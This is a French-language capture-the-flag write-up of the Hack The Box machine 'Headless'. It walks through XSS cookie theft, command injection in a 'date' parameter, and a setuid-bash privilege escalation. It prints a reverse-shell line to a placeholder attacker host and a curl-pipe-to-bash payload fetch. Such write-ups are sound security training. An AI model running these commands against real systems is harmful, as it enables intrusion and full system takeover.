---
date: 2024-07-19T22:17:23-05:00
# description: ""
image: "/images/HTB-Headless/Headless.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Headless"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Headless](https://app.hackthebox.com/machines/Headless)
* Niveau: Facile
* OS: Linux
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-headless/)

Headless débute avec un site web statique. L'énumération nous permet d'identifier un formulaire de contact vulnérable au Cross-Site Scripting (XSS), mais les payloads standards s'avèrent inefficaces. En capturant la valeur du cookie de l'administrateur, nous accédons à la page du tableau de bord, puis au système cible grâce à l'injection de commandes. Pour l'escalade des privilèges, nous exploitons un script pour obtenir le contrôle du compte root.

Addresse IP cible - `10.10.11.8`

## Balayage

```
nmap -sC -sV -oA nmap/Headless 10.10.11.8
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 13:01 CDT
Nmap scan report for 10.10.11.8
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 04 Apr 2024 18:01:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=4/4%Time=660EEB0C%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Thu,\x2004\x20Apr\x202024\x2018:01:48\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Constructi
SF:on</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20bo
SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
SF:20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE
SF:\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x2
SF:0\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respo
SF:nse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20versi
SF:on\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
SF:0unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.23 seconds
```

## Enumération

Nous trouvons le port 22 (SSH) et le port 5000 dont le service n'est pas immédiatement reconnu. Quelques éléments peuvent être notés:

* Il semble s'agir d'un serveur web d'après la réponse à la requête GetRequest.
* Le logiciel du serveur est identifié comme "Werkzeug/2.2.2 Python/3.11.2", ce qui suggère qu'il exécute une application web Python utilisant le framework [Werkzeug](https://werkzeug.palletsprojects.com/en/3.0.x/).

En visitant `http://10.10.11.8:5000/` nous trouvons une page web.

![Headless webiste](/images/HTB-Headless/website-build.png)

En cliquant sur le seul bouton présent, un formulaire de contact apparaît avec l'url `http://10.10.11.8:5000/support`.

![Contact Support form](/images/HTB-Headless/contact-form.png)

L'énumération des répertoires révèle `/dashboard` mais cette page est inaccessible actuellement et l'énumération des sous-domaines échoue. 

![Gobuster command results](/images/HTB-Headless/directory-bruteforcing.png)

![Dashboard page inaccessible](/images/HTB-Headless/dashboard-page.png)

Nous nous concentrons sur le formulaire de contact et le testons pour XSS.

![XSS attempt](/images/HTB-Headless/XSS-attempt.png)

Après la soumission, nous recevons un message indiquant qu'une tentative de piratage a été détectée. Nous pouvons donc supposer que si notre payload est capable de contourner le mécanisme de détection, nous serons en mesure d'exploiter la cible d'une manière ou d'une autre.

![XSS detected](/images/HTB-Headless/xss-detected.png)

Après plusieurs échecs de payloads, je remarque le nom du cookie `is_admin`; si nous obtenons la bonne valeur pour celui-ci, nous pourrons probablement accéder à `/dashboard`. La valeur actuelle du cookie indique `user` (il semble être encodé en base64).

Les payloads disponibles sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) ont tous échoué. En cherchant d'autres solutions, nous trouvons cet [article medium](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) qui explique une autre façon de récupérer le cookie. 

> J'ai essayé le payload avec le paramètre `message` seul sans succès, mais après l'avoir ajouté à `User-Agent`, nous sommes en mesure d'obtenir la valeur du cookie sur notre serveur web.

![Cookie stealing via XSS](/images/HTB-Headless/XSS-cookie-stealing-payload.png)

Le cookie est encodé en base64

![Admin cookie value](/images/HTB-Headless/admin-cookie-value.png)

![Admin cookie value decoded](/images/HTB-Headless/cookie-value-decoded.png)

Nous retournons à la page `/dashboard` et en utilisant la nouvelle valeur du cookie `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0` nous obtenons l'accès au tableau de bord de l'administrateur.

![Cookie-Editor](/images/HTB-Headless/cookie-editor.png)

![Admin dashboard accessed](/images/HTB-Headless/Admin-dashboard.png)

## Accès Initial

La seule option disponible est de sélectionner une date et de générer un rapport. Après avoir capturé la requête, nous observons que le seul nouveau paramètre est `date`. Testons l'injection de commande via ce paramètre.

![Generate Report request](/images/HTB-Headless/report-request.png)

Nous sommes en effet en mesure de faire de l'injection de commande via le paramètre.

![Command Injection verified](/images/HTB-Headless/command-injection.png)

Essayer d'obtenir un reverse shell directement via le paramètre `date` ne fonctionne pas, bien que la commande précédente ait été exécutée. 

```
date=2023-09-22;sh -i >& /dev/tcp/IP/PORT 0>&1
```

Puisque l'envoi du reverse shell ne fonctionne pas, nous pouvons essayer de l'exécuter via curl en ajoutant `bash` à la fin de la commande. Nous plaçons le reverse shell dans un fichier et nous l'exécutons sur la cible.

> Voici le reverse shell utilisé : `sh -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1`

```
curl http://IP:PORT/revshell.sh|bash
```

![Reverse shell](/images/HTB-Headless/reverse-shell.png)

Après avoir envoyé la requête, nous obtenons un shell sur notre listener en tant qu'utilisateur `dvir`.

![Foothold](/images/HTB-Headless/foothold.png)

Nous améliorons notre shell à l'aide des commandes ci-dessous.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116 
```

Dans le dossier personnel, nous trouvons le fichier `user.txt`.

![User flag](/images/HTB-Headless/user-flag.png)

## Elévation de Privilèges

Avec `sudo -l`, nous découvrons que cet utilisateur peut exécuter `/usr/bin/syscheck`.

![sudo -l command](/images/HTB-Headless/sudo-l.png)


```shell
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Le script effectue plusieurs tâches telles que la vérification des privilèges root, la vérification de l'espace disque disponible, etc. Mais notre chemin vers les privilèges root passe par le fichier `initdb.sh`.

Nous recherchons le fichier avec `find / -type f -name 'initdb.sh' 2>/dev/null` afin de le modifier, mais il n'est pas sur le système et nous devons donc le créer.

```
echo "chmod u+s /bin/bash" > initdb.sh
```
La commande ci-dessus crée le fichier `initdb.sh` contenant la commande `chmod u+s /bin/bash` qui met le bit setuid (`u+s`) sur l'exécutable `/bin/bash`.

L'utilisateur `dvir` est autorisé à exécuter la commande `/usr/bin/syscheck` avec les privilèges sudo sans fournir de mot de passe.

---

### Explication Détaillée 

`initdb.sh` fait partie du script exécuté par `/usr/bin/syscheck`, et `initdb.sh` contient la commande `chmod u+s /bin/bash`, donc `dvir` peut obtenir les privilèges root en exécutant `/usr/bin/syscheck`. Le processus est le suivant:

1. `dvir` exécute `/usr/bin/syscheck` avec les privilèges sudo.
2. Dans le script exécuté par `/usr/bin/syscheck`, `initdb.sh` est exécuté.
3. `initdb.sh` met le bit setuid sur `/bin/bash`, permettant à `/bin/bash` de s'exécuter avec les permissions de son propriétaire (root) lorsqu'il est exécuté par n'importe quel utilisateur.
4. Après l'exécution de `initdb.sh`, toute exécution ultérieure de `/bin/bash` par `dvir` s'exécutera avec les privilèges de root, grâce au bit setuid qui a été défini.

---

Avec les commandes `sudo /usr/bin/syscheck` et `/bin/bash -p`, nous devenons root et trouvons `root.txt` dans `/root`.

![root flag](/images/HTB-Headless/root-flag.png)

## Mots de Fin

Cette machine était relativement facile mais nécessitait une bonne compréhension de Linux et de Bash. Vous pouvez apprendre les deux sur HackTheBox Academy avec:

* [Linux Fundamentals](https://academy.hackthebox.com/module/details/18) et [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)
* [Introduction to Bash Scripting](https://academy.hackthebox.com/module/details/21)

Je recommande également de consulter plusieurs articles afin de découvrir différentes approches. Mes deux ressources favorites sont: [0xdf](https://0xdf.gitlab.io/2024/07/20/htb-headless.html#) et [IppSec](https://www.youtube.com/watch?v=FDCpJbS1OuQ&ab_channel=IppSec).
